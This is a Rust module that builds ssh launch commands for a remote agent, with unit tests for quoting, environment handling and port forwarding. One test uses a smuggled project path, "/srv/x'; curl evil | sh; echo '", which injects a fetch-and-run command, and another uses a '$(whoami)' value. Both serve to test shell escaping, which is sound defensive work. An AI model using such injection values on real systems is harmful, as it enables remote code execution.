//! Turning a configured remote into something that can be launched.
//!
//! The output is a plain command description — program, argv, local
//! environment — rather than anything from `rebon-acp-client`. That
//! keeps this crate out of the ACP dependency graph and lets the CLI
//! decide what to do with the result: an `AgentCommand` for a session,
//! or a raw `Command` for `rebon remote doctor`.

use std::collections::BTreeMap;

use crate::remote::host::{RemoteHost, Transport};
use crate::remote::shquote::sh_quote;
use crate::remote::ssh::{ssh_argv, PortForward, SshOptions};

/// Ports a forwarded transport picks from when the user has not
/// chosen one. High enough to be unprivileged, narrow enough that a
/// firewall rule can cover the range.
const FORWARD_PORT_BASE: u16 = 41_000;
const FORWARD_PORT_SPAN: u16 = 1_000;

/// A launchable remote agent.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RemoteLaunch {
    pub program: String,
    pub args: Vec<String>,
    /// Environment for the *local* ssh process. Remote environment is
    /// carried inside the command line instead — see
    /// [`remote_command`].
    pub env: BTreeMap<String, String>,
    /// Human-readable name for logs and the agent list.
    pub label: String,
    /// Appended to a spawn failure.
    pub install_hint: Option<String>,
    /// Set for [`Transport::Forward`]: where the local client should
    /// connect once ssh is up.
    pub forward: Option<PortForward>,
}

/// Everything the caller must decide before a remote can be launched.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LaunchPlan<'a> {
    /// Server build to run. Normally this Rebon's own version.
    pub version: &'a str,
    /// Executable name inside the versioned directory.
    pub binary_name: &'a str,
    /// Project directory on the remote. Falls back to the host's
    /// configured path.
    pub project_path: Option<&'a str>,
    /// Extra environment for the *remote* process — where forwarded
    /// credentials go.
    pub remote_env: BTreeMap<String, String>,
    /// Directory for ssh control sockets, when multiplexing.
    pub control_dir: Option<std::path::PathBuf>,
    /// Local port for [`Transport::Forward`]. `None` picks one.
    pub local_port: Option<u16>,
    /// Remote listen port for [`Transport::Forward`]. `None` derives
    /// one from the host name.
    pub remote_port: Option<u16>,
}

impl<'a> LaunchPlan<'a> {
    pub fn new(version: &'a str, binary_name: &'a str) -> Self {
        Self {
            version,
            binary_name,
            project_path: None,
            remote_env: BTreeMap::new(),
            control_dir: None,
            local_port: None,
            remote_port: None,
        }
    }
}

/// Build the remote command line that starts the agent.
///
/// Environment is inlined as `NAME=value … exec …` rather than sent
/// through ssh's `SendEnv`, because `SendEnv` needs a matching
/// `AcceptEnv` in the server's `sshd_config` — which almost no host
/// has for Rebon's variable names, and a silently dropped credential
/// looks exactly like a misconfigured provider.
///
/// `exec` replaces the wrapper shell so the agent is the process ssh
/// is talking to: one fewer process in the tree, and a signal on the
/// connection reaches the agent instead of its parent.
pub fn remote_command(host: &RemoteHost, plan: &LaunchPlan<'_>) -> String {
    let server = match host.install {
        // `system` and `npm` installs put `rebon` on the PATH rather
        // than in a versioned directory, so the command is just the
        // name and the remote shell resolves it.
        crate::remote::host::InstallStrategy::System
        | crate::remote::host::InstallStrategy::Npm => sh_quote("rebon"),
        _ => host.server_binary_expr(plan.version, plan.binary_name),
    };

    let mut parts = Vec::new();

    let path = plan.project_path.or(host.path.as_deref());
    if let Some(path) = path.map(str::trim).filter(|p| !p.is_empty()) {
        parts.push(format!("cd {}", sh_quote(path)));
    }

    // Host env first, then the plan's — a forwarded credential should
    // win over a stale value someone left in the host record.
    let mut env: BTreeMap<&str, &str> = BTreeMap::new();
    for (key, value) in &host.env {
        env.insert(key, value);
    }
    for (key, value) in &plan.remote_env {
        env.insert(key, value);
    }

    let mut exec = String::new();
    for (key, value) in env {
        exec.push_str(&format!("{}={} ", key, sh_quote(value)));
    }
    exec.push_str("exec ");
    exec.push_str(&server);
    exec.push_str(" --acp");

    if host.transport == Transport::Forward {
        let remote_port = plan.remote_port.unwrap_or_else(|| derive_port(&host.name));
        exec.push_str(&format!(" --acp-port {remote_port} --acp-host 127.0.0.1"));
    }

    parts.push(exec);
    parts.join(" && ")
}

/// Build the full launch description for a host.
pub fn launch(host: &RemoteHost, plan: &LaunchPlan<'_>) -> RemoteLaunch {
    let target = host.target();
    let mut options = SshOptions {
        // The session transport is the one place ssh must never
        // prompt: its stdio is the protocol.
        batch_mode: true,
        ..host.ssh_options()
    };
    if let Some(dir) = &plan.control_dir {
        options.control_dir = Some(dir.clone());
    } else {
        options.multiplex = false;
    }

    let command = crate::remote::ssh::sh_command(&remote_command(host, plan));

    let forward = (host.transport == Transport::Forward).then(|| {
        let remote_port = plan.remote_port.unwrap_or_else(|| derive_port(&host.name));
        PortForward {
            local_port: plan.local_port.unwrap_or(remote_port),
            remote_port,
        }
    });

    let args = ssh_argv(&target, &options, &command, forward);
    let (program, args) = args
        .split_first()
        .expect("ssh_argv always yields a program");

    RemoteLaunch {
        program: program.clone(),
        args: args.to_vec(),
        env: BTreeMap::new(),
        label: format!("{} ({})", host.name, target),
        install_hint: Some(format!(
            "run `rebon remote install {}` to put a matching server build on the host",
            host.name
        )),
        forward,
    }
}

/// Deterministic per-host port so two remotes do not collide and one
/// remote lands on the same port every time.
fn derive_port(name: &str) -> u16 {
    let mut hash: u32 = 2_166_136_261;
    for byte in name.as_bytes() {
        hash ^= u32::from(*byte);
        hash = hash.wrapping_mul(16_777_619);
    }
    FORWARD_PORT_BASE + (hash % u32::from(FORWARD_PORT_SPAN)) as u16
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::remote::host::InstallStrategy;

    fn host() -> RemoteHost {
        RemoteHost::from_target("prod", "deploy@build.example").unwrap()
    }

    fn plan<'a>() -> LaunchPlan<'a> {
        LaunchPlan::new("0.15.0", "rebon")
    }

    #[test]
    fn the_remote_command_runs_the_versioned_server_in_acp_mode() {
        let line = remote_command(&host(), &plan());
        assert_eq!(line, r#"exec "$HOME"/.rebon/server/0.15.0/rebon --acp"#);
    }

    #[test]
    fn a_project_path_becomes_a_cd_before_the_exec() {
        let mut host = host();
        host.path = Some("/srv/app".into());
        let line = remote_command(&host, &plan());
        assert_eq!(
            line,
            r#"cd /srv/app && exec "$HOME"/.rebon/server/0.15.0/rebon --acp"#
        );
    }

    #[test]
    fn a_plan_path_overrides_the_hosts_default() {
        let mut host = host();
        host.path = Some("/srv/app".into());
        let mut plan = plan();
        plan.project_path = Some("/srv/other");
        assert!(remote_command(&host, &plan).starts_with("cd /srv/other &&"));
    }

    #[test]
    fn a_blank_path_does_not_produce_an_empty_cd() {
        let mut host = host();
        host.path = Some("   ".into());
        assert!(!remote_command(&host, &plan()).contains("cd "));
    }

    #[test]
    fn a_hostile_project_path_reaches_the_command_only_in_quoted_form() {
        let raw = "/srv/x'; curl evil | sh; echo '";
        let mut host = host();
        host.path = Some(raw.into());
        let line = remote_command(&host, &plan());
        assert!(line.contains(&sh_quote(raw)), "{line}");
        // The raw form would end the `cd` argument and start a second
        // command; the quoted form cannot.
        assert!(!line.contains(&format!("cd {raw}")), "{line}");
    }

    #[test]
    fn remote_environment_is_inlined_ahead_of_exec() {
        // SendEnv would need the server's cooperation; this does not.
        let mut plan = plan();
        plan.remote_env
            .insert("REBON_API_KEY".into(), "sk-secret".into());
        let line = remote_command(&host(), &plan);
        assert!(line.contains("REBON_API_KEY=sk-secret exec "), "{line}");
    }

    #[test]
    fn an_env_value_with_shell_characters_is_quoted() {
        let mut plan = plan();
        plan.remote_env
            .insert("TOKEN".into(), "a b$(whoami)".into());
        let line = remote_command(&host(), &plan);
        assert!(line.contains("TOKEN='a b$(whoami)'"), "{line}");
    }

    #[test]
    fn a_plan_value_wins_over_a_stale_host_value() {
        let mut host = host();
        host.env.insert("TOKEN".into(), "old".into());
        let mut plan = plan();
        plan.remote_env.insert("TOKEN".into(), "new".into());
        let line = remote_command(&host, &plan);
        assert!(line.contains("TOKEN=new"), "{line}");
        assert!(!line.contains("TOKEN=old"), "{line}");
    }

    #[test]
    fn path_installs_run_rebon_off_the_remote_path() {
        for strategy in [InstallStrategy::System, InstallStrategy::Npm] {
            let mut host = host();
            host.install = strategy;
            let line = remote_command(&host, &plan());
            assert_eq!(line, "exec rebon --acp", "{strategy:?}");
        }
    }

    #[test]
    fn stdio_transport_asks_for_no_port() {
        let line = remote_command(&host(), &plan());
        assert!(!line.contains("--acp-port"), "{line}");
    }

    #[test]
    fn forward_transport_binds_the_remote_listener_to_loopback() {
        // Binding anything else would expose the agent — which
        // executes shell commands — to the server's network.
        let mut host = host();
        host.transport = Transport::Forward;
        let line = remote_command(&host, &plan());
        assert!(line.contains("--acp-host 127.0.0.1"), "{line}");
        assert!(line.contains("--acp-port 4"), "{line}");
    }

    #[test]
    fn a_launch_is_an_ssh_process_with_the_command_last() {
        let launch = launch(&host(), &plan());
        assert_eq!(launch.program, "ssh");
        assert_eq!(
            launch.args.last().unwrap(),
            &format!(
                "/bin/sh -c {}",
                crate::remote::shquote::sh_quote(
                    r#"exec "$HOME"/.rebon/server/0.15.0/rebon --acp"#
                )
            )
        );
        assert!(launch.label.contains("prod"), "{}", launch.label);
        assert!(launch
            .install_hint
            .unwrap()
            .contains("rebon remote install prod"));
    }

    #[test]
    fn a_launch_never_lets_ssh_prompt() {
        // The prompt would be written into the ACP stream.
        let launch = launch(&host(), &plan());
        assert!(
            launch.args.windows(2).any(|w| w == ["-o", "BatchMode=yes"]),
            "{:?}",
            launch.args
        );
    }

    #[test]
    fn no_control_dir_means_no_multiplexing() {
        let bare = launch(&host(), &plan());
        assert!(!bare.args.iter().any(|a| a.starts_with("ControlPath=")));
    }

    #[cfg(unix)]
    #[test]
    fn a_control_dir_turns_multiplexing_on_where_ssh_supports_it() {
        let mut plan = plan();
        plan.control_dir = Some(std::path::PathBuf::from("/tmp/rebon-ssh"));
        let wired = launch(&host(), &plan);
        assert!(wired.args.iter().any(|a| a.starts_with("ControlPath=")));
    }

    #[cfg(windows)]
    #[test]
    fn a_control_dir_is_ignored_on_windows_where_ssh_rejects_it() {
        // Win32 OpenSSH has no ControlMaster; emitting it would make
        // every remote connection fail outright.
        let mut plan = plan();
        plan.control_dir = Some(std::path::PathBuf::from("C:/tmp/rebon-ssh"));
        let wired = launch(&host(), &plan);
        assert!(!wired.args.iter().any(|a| a.starts_with("ControlPath=")));
    }

    #[test]
    fn a_forwarded_launch_reports_where_to_connect() {
        let mut host = host();
        host.transport = Transport::Forward;
        let launch = launch(&host, &plan());
        let forward = launch.forward.expect("forward");
        // Same port on both sides by default, so the user sees one
        // number rather than two.
        assert_eq!(forward.local_port, forward.remote_port);
        assert!(launch.args.iter().any(|a| a.contains("127.0.0.1:")));
    }

    #[test]
    fn an_explicit_local_port_is_honoured() {
        let mut host = host();
        host.transport = Transport::Forward;
        let mut plan = plan();
        plan.local_port = Some(7788);
        plan.remote_port = Some(41999);
        let launch = launch(&host, &plan);
        let forward = launch.forward.expect("forward");
        assert_eq!(forward.local_port, 7788);
        assert_eq!(forward.remote_port, 41999);
        assert!(launch
            .args
            .iter()
            .any(|a| a == "127.0.0.1:7788:127.0.0.1:41999"));
    }

    #[test]
    fn derived_ports_are_stable_and_in_range() {
        let a = derive_port("prod");
        assert_eq!(a, derive_port("prod"));
        assert!((FORWARD_PORT_BASE..FORWARD_PORT_BASE + FORWARD_PORT_SPAN).contains(&a));
        assert_ne!(derive_port("prod"), derive_port("staging"));
    }
}
